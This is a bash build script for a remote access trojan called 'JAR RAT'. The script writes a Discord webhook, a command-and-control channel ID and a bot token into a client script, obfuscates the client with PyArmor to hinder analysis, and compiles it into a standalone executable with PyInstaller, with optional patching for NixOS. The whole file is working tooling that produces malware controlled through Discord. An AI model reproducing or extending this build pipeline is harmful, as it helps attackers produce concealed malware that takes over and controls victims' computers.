#!/usr/bin/env bash
set -e

VENV_DIR="venv"
OBFUSCATED_DIR="obfuscated_client"
CLIENT_SCRIPT="client.py" # This should be your discord_c2_client_py
TEMP_CLIENT_SCRIPT="client_temp_build.py"
SPEC_TEMPLATE="client_base.spec"
ENV_FILE=".env"

echo "--- JAR RAT Build Script (Discord C2 Client) ---"

echo "[1/10] Cleaning previous build artifacts..."
rm -rf "$VENV_DIR" "$OBFUSCATED_DIR" dist/ build/ "$TEMP_CLIENT_SCRIPT" # Spec file removed later
echo "Cleaned."

# Initialize default values to empty or N/A
DISCORD_WEBHOOK_URL_FROM_ENV="N/A"
DISCORD_C2_CHANNEL_ID_FROM_ENV="N/A"
DISCORD_BOT_TOKEN_FROM_ENV="N/A"


# Load .env file if it exists
if [ -f "$ENV_FILE" ]; then
    echo "Loading configuration from $ENV_FILE..."
    # Source the .env file. CAUTION: This executes commands in .env file.
    # Ensure .env file is trusted and only contains variable assignments.
    set -o allexport # Export all variables defined from now on
    source "$ENV_FILE"
    set +o allexport # Stop exporting
    
    # Assign to our specific default variables after sourcing
    DISCORD_WEBHOOK_URL_FROM_ENV="${DISCORD_CLIENT_WEBHOOK_URL:-N/A}"
    DISCORD_C2_CHANNEL_ID_FROM_ENV="${DISCORD_C2_CHANNEL_ID:-N/A}"
    DISCORD_BOT_TOKEN_FROM_ENV="${DISCORD_BOT_TOKEN:-N/A}"
    echo ".env file loaded."
else
    echo "No .env file found. Will prompt for all configurations."
fi

echo "--- Discord C2 Configuration ---"

# Read Webhook URL
read -p "Enter Discord Webhook URL (for client output) [default: ${DISCORD_WEBHOOK_URL_FROM_ENV}]: " USER_DISCORD_WEBHOOK_URL
if [ -z "$USER_DISCORD_WEBHOOK_URL" ]; then
    USER_DISCORD_WEBHOOK_URL="${DISCORD_WEBHOOK_URL_FROM_ENV}"
    if [ "$USER_DISCORD_WEBHOOK_URL" == "N/A" ]; then USER_DISCORD_WEBHOOK_URL=""; fi # Ensure it's empty if default was N/A and user hit enter
fi

# Read C2 Channel ID
read -p "Enter Discord C2 Channel ID (for client polling) [default: ${DISCORD_C2_CHANNEL_ID_FROM_ENV}]: " USER_DISCORD_C2_CHANNEL_ID
if [ -z "$USER_DISCORD_C2_CHANNEL_ID" ]; then
    USER_DISCORD_C2_CHANNEL_ID="${DISCORD_C2_CHANNEL_ID_FROM_ENV}"
    if [ "$USER_DISCORD_C2_CHANNEL_ID" == "N/A" ]; then USER_DISCORD_C2_CHANNEL_ID=""; fi
fi

# Read Bot Token
echo -e "\033[0;31mWARNING: Embedding a Bot Token directly in the client is a security risk!\033[0m"
read -p "Enter Discord Bot Token (for client polling) [default: ${DISCORD_BOT_TOKEN_FROM_ENV}]: " USER_DISCORD_BOT_TOKEN
if [ -z "$USER_DISCORD_BOT_TOKEN" ]; then
    USER_DISCORD_BOT_TOKEN="${DISCORD_BOT_TOKEN_FROM_ENV}"
    if [ "$USER_DISCORD_BOT_TOKEN" == "N/A" ]; then USER_DISCORD_BOT_TOKEN=""; fi
fi


if [ -z "$USER_DISCORD_WEBHOOK_URL" ] || [ "$USER_DISCORD_WEBHOOK_URL" == "N/A" ] || \
   [ -z "$USER_DISCORD_C2_CHANNEL_ID" ] || [ "$USER_DISCORD_C2_CHANNEL_ID" == "N/A" ] || \
   [ -z "$USER_DISCORD_BOT_TOKEN" ] || [ "$USER_DISCORD_BOT_TOKEN" == "N/A" ]; then
    echo -e "\033[0;31mError: All Discord configuration values must be provided (either via prompt or .env file). Exiting.\033[0m"
    exit 1
fi
echo "Client will use the following Discord configuration:"
echo "  Webhook URL: $USER_DISCORD_WEBHOOK_URL"
echo "  C2 Channel ID: $USER_DISCORD_C2_CHANNEL_ID"
echo "  Bot Token: ************ (hidden for security)"
echo "----------------------------------"

echo "--- Output Executable Configuration ---"
read -p "Enter desired output executable name (default: client_discord_obf): " USER_OUTPUT_NAME
if [ -z "$USER_OUTPUT_NAME" ]; then
    OUTPUT_NAME="client_discord_obf"
else
    OUTPUT_NAME="$USER_OUTPUT_NAME"
fi
echo "Output executable will be named: $OUTPUT_NAME"
echo "-------------------------------------"

SPEC_FILE="${OUTPUT_NAME}.spec"
FINAL_EXECUTABLE="dist/$OUTPUT_NAME"
PYTHON_BIN="python3"

echo "[2/10] Creating virtual environment..."
"$PYTHON_BIN" -m venv "$VENV_DIR"
source "$VENV_DIR/bin/activate"
echo "Virtual environment created and activated."

echo "[3/10] Installing Python dependencies (pyinstaller, pyarmor.cli, requests)..."
pip install pyinstaller pyarmor.cli requests > /dev/null
echo "Dependencies installed."

echo "[4/10] Preparing client script with Discord configuration..."
if [ ! -f "$CLIENT_SCRIPT" ]; then
    echo "Error: Client script '$CLIENT_SCRIPT' not found."
    if type deactivate &>/dev/null; then deactivate; fi
    exit 1
fi
cp "$CLIENT_SCRIPT" "$TEMP_CLIENT_SCRIPT"

# Replace placeholders in the temporary client script
sed -i "s|DISCORD_WEBHOOK_URL = \"YOUR_DISCORD_WEBHOOK_URL_HERE\"|DISCORD_WEBHOOK_URL = \"${USER_DISCORD_WEBHOOK_URL}\"|g" "$TEMP_CLIENT_SCRIPT"
sed -i "s|DISCORD_C2_CHANNEL_ID_FOR_POLLING = \"YOUR_DISCORD_C2_CHANNEL_ID_HERE\"|DISCORD_C2_CHANNEL_ID_FOR_POLLING = \"${USER_DISCORD_C2_CHANNEL_ID}\"|g" "$TEMP_CLIENT_SCRIPT"
sed -i "s|DISCORD_BOT_TOKEN_FOR_POLLING = \"YOUR_DISCORD_BOT_TOKEN_HERE\"|DISCORD_BOT_TOKEN_FOR_POLLING = \"${USER_DISCORD_BOT_TOKEN}\"|g" "$TEMP_CLIENT_SCRIPT"

echo "Client script configured with Discord settings."

echo "[5/10] Obfuscating client script with PyArmor..."
pyarmor gen --output "$OBFUSCATED_DIR" "$TEMP_CLIENT_SCRIPT" > /dev/null
echo "Client script obfuscated."

echo "[6/10] Verifying PyArmor runtime..."
PYARMOR_RUNTIME_FOLDER=$(find "$OBFUSCATED_DIR" -maxdepth 1 -type d -name "pyarmor_runtime_*" -print -quit)
if [ -z "$PYARMOR_RUNTIME_FOLDER" ]; then
    echo "Error: PyArmor runtime folder not found in '$OBFUSCATED_DIR'."
    if type deactivate &>/dev/null; then deactivate; fi; rm -f "$TEMP_CLIENT_SCRIPT"; exit 1
fi
PYARMOR_RUNTIME_BASENAME=$(basename "$PYARMOR_RUNTIME_FOLDER") # e.g., pyarmor_runtime_000000
PYARMOR_SO_PATH="${PYARMOR_RUNTIME_FOLDER}/pyarmor_runtime.so"

if [ -f "$PYARMOR_SO_PATH" ]; then
    PYARMOR_SO_ELF_INFO=$(file -L -b "$PYARMOR_SO_PATH")
    if [[ "$PYARMOR_SO_ELF_INFO" == *"ELF 32-bit"* ]]; then
        echo "WARNING: PyArmor runtime ($PYARMOR_SO_PATH) detected as 32-BIT!"
        echo "         This may cause issues on a 64-bit system."
    elif [[ "$PYARMOR_SO_ELF_INFO" == *"ELF 64-bit"* || "$PYARMOR_SO_ELF_INFO" == *"x86-64"* || "$PYARMOR_SO_ELF_INFO" == *"x86_64"* ]]; then
        echo "PyArmor runtime detected as 64-bit (Correct)."
    else
        echo "WARNING: Could not confirm PyArmor runtime architecture from output: '$PYARMOR_SO_ELF_INFO'."
    fi
else
    echo "Error: PyArmor runtime module (pyarmor_runtime.so) not found in '$PYARMOR_RUNTIME_FOLDER'."
    if type deactivate &>/dev/null; then deactivate; fi; rm -f "$TEMP_CLIENT_SCRIPT"; rm -rf "$OBFUSCATED_DIR"; exit 1
fi

echo "[7/10] Creating PyInstaller .spec file..."
if [ ! -f "$SPEC_TEMPLATE" ]; then
    echo "Error: Spec template file '$SPEC_TEMPLATE' not found."
    if type deactivate &>/dev/null; then deactivate; fi; rm -f "$TEMP_CLIENT_SCRIPT"; rm -rf "$OBFUSCATED_DIR"; exit 1
fi
OBFUSCATED_CLIENT_PATH_IN_SPEC="${OBFUSCATED_DIR}/${TEMP_CLIENT_SCRIPT}"
PYARMOR_DATA_SOURCE_IN_SPEC="${OBFUSCATED_DIR}/${PYARMOR_RUNTIME_BASENAME}"

sed -e "s|{{OBFUSCATED_CLIENT_PATH}}|${OBFUSCATED_CLIENT_PATH_IN_SPEC}|g" \
    -e "s|{{PYARMOR_DATA_SOURCE}}|${PYARMOR_DATA_SOURCE_IN_SPEC}|g" \
    -e "s|{{PYARMOR_RUNTIME_DEST_DIR_NAME}}|${PYARMOR_RUNTIME_BASENAME}|g" \
    -e "s|name='client_obf'|name='${OUTPUT_NAME}'|g" \
    "$SPEC_TEMPLATE" > "$SPEC_FILE"
echo ".spec file created: '$SPEC_FILE'"

echo "[8/10] Building final executable with PyInstaller..."
pyinstaller "$SPEC_FILE" > /dev/null
echo "Executable built in 'dist/' directory."

echo ""
while read -t 0.01 -n 1 discard_char; do :; done
read -p "Do you want to patch the executable for NixOS (y/N)? " -n 1 -r
echo

if [[ "$REPLY" =~ ^[Yy]$ ]]; then
    echo "[9/10] Patching executable for NixOS with patchelf..."
    if [ -x "$(command -v patchelf)" ] && [ -d "/nix/store" ] && [ -n "$NIX_CC" ]; then
        NIX_LD_PATH=$(cat "$NIX_CC/nix-support/dynamic-linker")
        NIX_LIBC_PATH=""
        NIX_ZLIB_PATH=""

        EXPECTED_LIBC_SO_PATH="$(dirname "$NIX_LD_PATH")/libc.so.6"
        if [ -f "$EXPECTED_LIBC_SO_PATH" ]; then
            LIBC_FILE_OUTPUT=$(file -L -b "$EXPECTED_LIBC_SO_PATH")
            if [[ "$LIBC_FILE_OUTPUT" == *"ELF 64-bit"* || "$LIBC_FILE_OUTPUT" == *"x86-64"* || "$LIBC_FILE_OUTPUT" == *"x86_64"* ]]; then
                NIX_LIBC_PATH=$(dirname "$EXPECTED_LIBC_SO_PATH")
            else
                echo "Warning: Candidate libc.so.6 ($EXPECTED_LIBC_SO_PATH) not identified as 64-bit."
            fi
        else
            echo "Warning: Main libc.so.6 not found at: $EXPECTED_LIBC_SO_PATH."
        fi

        FOUND_ZLIB_SO_PATH=""
        mapfile -t zlib_candidates < <(find -L /nix/store -maxdepth 5 -path '*/lib/libz.so.1' -type f -print 2>/dev/null)
        for candidate_zlib in "${zlib_candidates[@]}"; do
            if [ -f "$candidate_zlib" ]; then
                ZLIB_FILE_OUTPUT=$(file -L -b "$candidate_zlib")
                if [[ "$ZLIB_FILE_OUTPUT" == *"ELF 64-bit"* || "$ZLIB_FILE_OUTPUT" == *"x86-64"* || "$ZLIB_FILE_OUTPUT" == *"x86_64"* ]]; then
                    if [[ "$candidate_zlib" != *i686* && "$candidate_zlib" != *i386* ]]; then
                        FOUND_ZLIB_SO_PATH="$candidate_zlib"
                        break
                    fi
                fi
            fi
        done
        if [ -n "$FOUND_ZLIB_SO_PATH" ]; then
            NIX_ZLIB_PATH=$(dirname "$FOUND_ZLIB_SO_PATH")
        else
             echo "Warning: Failed to find a suitable 64-bit libz.so.1."
        fi

        if [ -n "$NIX_LD_PATH" ] && [ -n "$NIX_LIBC_PATH" ] && [ -n "$NIX_ZLIB_PATH" ] && [ -f "$FINAL_EXECUTABLE" ]; then
            echo "Patching $FINAL_EXECUTABLE with:"
            echo "  Interpreter: $NIX_LD_PATH"
            echo "  RPATH LibC:  $NIX_LIBC_PATH"
            echo "  RPATH ZLib:  $NIX_ZLIB_PATH"
            patchelf \
                --set-interpreter "$NIX_LD_PATH" \
                --add-rpath "$NIX_LIBC_PATH" \
                --add-rpath "$NIX_ZLIB_PATH" \
                "$FINAL_EXECUTABLE"
            echo "Executable patched successfully for NixOS."
            echo "NixOS Portability Note: This executable is specific to this machine's"
            echo "Nix store paths. It will likely NOT RUN on other NixOS systems."
        else
            echo "Error: Patchelf failed. Necessary library paths not resolved or executable missing."
            echo "  LD Path: ${NIX_LD_PATH:-Not resolved}"
            echo "  LibC Dir: ${NIX_LIBC_PATH:-Not resolved}"
            echo "  ZLib Dir: ${NIX_ZLIB_PATH:-Not resolved}"
            echo "Your executable may not run correctly on NixOS."
        fi
    else
        echo "Warning: Not in a NixOS environment (or prerequisites missing). Patchelf skipped."
    fi
else
    echo "[9/10] NixOS patchelf skipped by user request."
fi

echo "[10/10] Finalizing build..."
if type deactivate &>/dev/null; then deactivate; fi
rm -f "$TEMP_CLIENT_SCRIPT" "$SPEC_FILE" # Clean up temp and generated spec
echo "Build process complete!"
echo "Executable is at: $FINAL_EXECUTABLE"
echo ""
echo "IMPORTANT: Ensure the Discord Webhook URL, C2 Channel ID, and Bot Token"
echo "are correctly configured in the client and that the Discord Bot has"
echo "the necessary permissions and intents enabled (especially Message Content Intent)."

